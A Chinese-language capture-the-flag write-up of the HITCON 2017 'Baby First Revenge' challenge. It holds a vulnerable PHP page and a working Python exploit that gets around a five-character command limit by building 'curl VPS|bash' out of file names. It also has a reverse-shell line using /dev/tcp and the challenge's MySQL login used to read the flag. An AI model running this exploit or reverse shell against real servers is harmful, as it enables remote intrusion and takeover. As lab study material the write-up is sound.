# 2017 Baby First Revenge
```php
 <?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

需要绕过 5 个字符的限制执行命令。

先介绍两个 trick：

1. 命令过长可以通过 `\` 进行换行续写
2. 文件中当前命令错误不影响之后命令的执行

通过上述两个 trick 即可执行命令，思路是分段写出 `curl VPS` 指令，而为了生成该命令可以利用 `>[dir]` 命令生成 dir 名称的文件夹的方式生成分段后的命令，然后通过 `ls -t>g`  将分段的命令写入文件，`sh` 执行文件反弹 shell。

由于长度限制，需要先将 `ls -t>g` 分段，倒序生成文件夹名（-t 时间排序的需要）

```shell
>-t\
>\>g
>l\
>s\ \
```

生成对应名称文件夹后，由于 `ls` 名称列出按字母顺序的问题，需要先重定向到 c 文件，然后再 `ls` 附加的 c 文件尾部
```shell
ls>c
ls>>c

cat a
-t\
>g
a   # 以上无效命令
l\  
s \
-t\
>g
a   # 以下无效命令
l\
s \
```

生成的 a 文件的功能就是执行 `ls -t>g`

有了该命令之后就只需要反弹 shell 了。
通过在自己的 `VPS/index.html` 写入 shell
```shell
bash -i >& /dev/tcp/vps/port 0>&1
```

然后利用 `ls -t` 生成 `curl VPS|bash` 命令，执行即可反弹 shell 到 VPS。

在 Orange 大大提供的 exp 上修改：

```Python
import requests
from time import sleep
from urllib import quote

payload = [
    # generate `ls -t>g` file `_`
    '>ls\\',
    'ls>_',
    '>\ \\',
    '>-t\\',
    '>\>g',
    'ls>>_',

    # generate `curl VPS|bash`
    # * 为隐去的 VPS ip 地址十进制的某位
    '>sh\ ',
    '>ba\\',
    '>\|\\',
    '>2\\',
    '>1*\\',
    '>8*\\',
    '>5*\\',
    '>7*\\',
    '>\ \\',
    '>rl\\',
    '>cu\\',

    # exec
    'sh _', 
    'sh g', 
]

r = requests.get('http://127.0.0.1:8008/?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://127.0.0.1:8008/?cmd=' + quote(i))
    print(i)
    sleep(0.2)
```

然后监听反弹 shell

![shell](img/shell.png)


在根目录找到 README.txt
```
Flag is in the MySQL database
fl4444g / SugZXUtgeJ52_Bvr
```

最后通过执行 SQL 找到 Flag
```SQL
mysql -u fl4444g -pSugZXUtgeJ52_Bvr -e "show databases;";
mysql -u fl4444g -pSugZXUtgeJ52_Bvr -e "use fl4gdb;show tables;"
mysql -u fl4444g -pSugZXUtgeJ52_Bvr -e "use fl4gdb;select * from this_is_the_fl4g;";
```

## References
[HITCON 2017 babyfirst-revenge[-v2]浅析](https://xz.aliyun.com/t/1579)
